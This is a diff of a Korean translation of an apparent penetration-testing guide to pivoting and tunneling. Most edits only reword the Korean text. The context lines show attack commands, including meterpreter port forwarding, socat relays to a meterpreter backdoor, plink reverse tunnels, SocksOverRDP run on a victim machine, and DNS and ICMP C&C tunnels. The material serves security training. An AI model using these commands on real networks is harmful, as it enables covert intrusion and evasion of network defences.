@@ -104,7 +104,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-로컬 포트 --> 손상된 호스트 (활성 세션) --> 제3의 박스:포트
+로컬 포트 --> 손상된 호스트 (활성 세션) --> 제3_박스:포트
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -132,7 +132,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
 ## Cobalt Strike
 
-### SOCKS 프록시
+### SOCKS proxy
 
 팀 서버에서 모든 인터페이스에서 수신 대기하는 포트를 열어 **비콘을 통해 트래픽을 라우팅**하는 데 사용할 수 있습니다.
 ```bash
@@ -154,7 +154,7 @@ To note:
 
 - Beacon의 리버스 포트 포워드는 **개별 머신 간의 중계가 아니라 Team Server로 트래픽을 터널링하기 위해 설계되었습니다**.
 - 트래픽은 **Beacon의 C2 트래픽 내에서 터널링됩니다**, P2P 링크를 포함하여.
-- **관리자 권한이 필요하지 않습니다** 고포트에서 리버스 포트 포워드를 생성하는 데.
+- **리버스 포트 포워드를 생성하는 데 관리자 권한이 필요하지 않습니다** 고포트에서.
 
 ### rPort2Port local
 
@@ -175,7 +175,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ## Chisel
 
 You can download it from the releases page of [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
-You need to use the **same version for client and server**
+**클라이언트와 서버에 대해 동일한 버전을 사용해야 합니다.**
 
 ### socks
 ```bash
@@ -276,7 +276,7 @@ socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### SSL Socat을 통한 Meterpreter
+### Meterpreter를 통한 SSL Socat
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -331,7 +331,7 @@ echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0
 
 ### Port2Port
 
-로컬 관리자여야 합니다 (모든 포트에 대해)
+로컬 관리자가 되어야 합니다 (모든 포트에 대해)
 ```bash
 netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
 # Example:
@@ -354,7 +354,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-이제 **`mstsc.exe`**를 사용하여 **RDP**를 통해 **희생자**에 **연결**할 수 있으며, **SocksOverRDP 플러그인이 활성화되었다는** **프롬프트**를 받게 되고, **127.0.0.1:1080**에서 **수신** 대기할 것입니다.
+이제 **`mstsc.exe`**를 사용하여 **RDP**를 통해 **희생자**에 **연결**할 수 있으며, **SocksOverRDP 플러그인이 활성화되었다는** **프롬프트**를 받게 되고, **127.0.0.1:1080**에서 **대기**할 것입니다.
 
 **RDP**를 통해 **연결**하고 희생자 머신에 `SocksOverRDP-Server.exe` 바이너리를 업로드 및 실행합니다:
 ```
@@ -383,7 +383,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-프록시에 대해 인증하고 외부 서비스에 지정한 포트에 로컬로 바인딩합니다. 그런 다음 이 포트를 통해 원하는 도구를 사용할 수 있습니다.\
+프록시에 대해 인증하고 지정한 외부 서비스로 포트를 로컬에서 바인딩합니다. 그런 다음 이 포트를 통해 원하는 도구를 사용할 수 있습니다.\
 예를 들어 포트 443을 포워딩합니다.
 ```
 Username Alice
@@ -393,7 +393,7 @@ Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
 이제, 예를 들어 피해자의 **SSH** 서비스가 포트 443에서 수신 대기하도록 설정하면, 공격자는 포트 2222를 통해 연결할 수 있습니다.\
-또한 **meterpreter**를 사용하여 localhost:443에 연결하고 공격자가 포트 2222에서 수신 대기하도록 할 수 있습니다.
+또한 **meterpreter**를 사용하여 localhost:443에 연결하고 공격자가 포트 2222에서 수신 대기할 수도 있습니다.
 
 ## YARP
 
@@ -417,7 +417,7 @@ ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
 ### DNSCat2
 
-[**여기에서 다운로드**](https://github.com/iagox86/dnscat2)**.**
+[**여기에서 다운로드하세요**](https://github.com/iagox86/dnscat2)**.**
 
 DNS를 통해 C\&C 채널을 설정합니다. 루트 권한이 필요하지 않습니다.
 ```bash
@@ -455,7 +455,7 @@ Proxychains는 `gethostbyname` libc 호출을 가로채고 TCP DNS 요청을 soc
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-두 시스템 모두에서 루트 권한이 필요하며, ICMP 에코 요청을 사용하여 tun 어댑터를 생성하고 데이터 간에 터널링합니다.
+두 시스템 모두에서 루트 권한이 필요하며, ICMP 에코 요청을 사용하여 터널 어댑터를 생성하고 데이터 간에 터널링합니다.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -480,7 +480,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **는 한 줄의 명령어로 솔루션을 인터넷에 노출하는 도구입니다.**\
-_&#x45;xposition URI는 다음과 같습니다:_ **UID.ngrok.io**
+_노출 URI는 다음과 같습니다:_ **UID.ngrok.io**
 
 ### 설치
 
